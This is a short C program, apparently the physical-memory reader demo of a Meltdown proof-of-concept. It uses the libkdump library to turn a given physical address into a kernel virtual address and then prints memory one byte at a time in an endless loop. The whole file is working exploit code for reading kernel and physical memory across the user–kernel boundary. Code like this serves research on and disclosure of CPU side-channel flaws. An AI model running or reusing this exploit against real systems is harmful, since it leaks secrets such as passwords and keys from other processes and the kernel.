#include "libkdump.h"
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {

  size_t phys;
  if (argc < 2) {
    printf("Usage: %s <physical address> [<direct physical map>]\n", argv[0]);
    return 0;
  }

  phys = strtoull(argv[1], NULL, 0);

  libkdump_config_t config;
  config = libkdump_get_autoconfig();
  /*if (argc > 2) {
    config.physical_offset = strtoull(argv[2], NULL, 0);
  }*/

  libkdump_init(config);

  // Converts physical address to virtual address using direct map offset
  size_t vaddr = libkdump_phys_to_virt(phys);

  printf("Physical address       : %zx\n", phys);
  printf("Physical offset        : %zx\n", config.physical_offset);
  printf("Reading virtual address: %zx\n", vaddr);

  while (1) {
    
    // Reads one character from the given virtual address using Meltdown
    int value = libkdump_read(vaddr);

    printf("%c", value);
    fflush(stdout);
    vaddr++;
  }

  libkdump_cleanup();

  return 0;
}